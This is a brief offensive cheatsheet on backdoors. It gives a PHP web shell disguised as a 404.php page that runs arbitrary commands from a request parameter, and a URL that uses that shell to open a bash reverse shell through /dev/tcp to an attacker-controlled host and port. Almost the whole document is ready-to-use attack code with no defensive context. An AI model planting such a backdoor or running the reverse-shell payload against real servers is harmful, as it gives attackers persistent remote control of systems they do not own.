# Backdoors cheatsheets

### PHP backdoor 
> /var/www/html/404.php
```php
<?php 

    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }

?>
```
#### Accessing backdoor php
```bash
http://<target-ip>/404.php?cmd=bash -i >& /dev/tcp/<local-ip>/4444 0>&1
```
